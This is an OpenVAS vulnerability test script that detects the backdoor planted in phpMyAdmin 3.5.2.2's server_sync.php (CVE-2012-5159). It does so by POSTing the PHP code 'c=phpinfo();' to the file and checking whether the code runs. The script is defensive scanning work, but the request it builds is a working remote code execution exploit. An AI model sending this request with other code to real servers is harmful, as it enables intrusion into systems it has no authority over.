###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_phpmyadmin_55672.nasl 11425 2018-09-17 09:11:30Z asteins $
#
# phpMyAdmin 'server_sync.php' Backdoor Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################
CPE = "cpe:/a:phpmyadmin:phpmyadmin";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103577");
  script_bugtraq_id(55672);
  script_cve_id("CVE-2012-5159");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_version("$Revision: 11425 $");

  script_name("phpMyAdmin 'server_sync.php' Backdoor Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/55672");
  script_xref(name:"URL", value:"http://www.phpmyadmin.net/home_page/security/PMASA-2012-5.php");
  script_xref(name:"URL", value:"http://www.phpmyadmin.net/");

  script_tag(name:"last_modification", value:"$Date: 2018-09-17 11:11:30 +0200 (Mon, 17 Sep 2018) $");
  script_tag(name:"creation_date", value:"2012-09-26 09:52:24 +0200 (Wed, 26 Sep 2012)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("secpod_phpmyadmin_detect_900129.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("phpMyAdmin/installed");
  script_tag(name:"solution", value:"The vendor released an update. Please see the references for details.");
  script_tag(name:"summary", value:"phpMyAdmin is prone to a backdoor vulnerability.");

  script_tag(name:"impact", value:"Attackers can exploit this issue to execute arbitrary code in the
context of the application. Successful attacks will compromise the
affected application.");

  script_tag(name:"affected", value:"phpMyAdmin 3.5.2.2 is vulnerable, other versions may also be affected.");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE))exit(0);
if(!dir = get_app_location(cpe:CPE, port:port))exit(0);

url = dir + '/server_sync.php';

req = http_get(item:url, port:port);
buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if(buf =~ "HTTP/1.. 404")exit(0);

host = get_host_name();

ex = 'c=phpinfo();';
len = strlen(ex);

req = string("POST ", url, " HTTP/1.1\r\n",
             "Host: ", host,"\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: ", len,"\r\n",
             "\r\n",
             ex);

result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if("<title>phpinfo()" >< result) {

  security_message(port:port);
  exit(0);
}

exit(0);
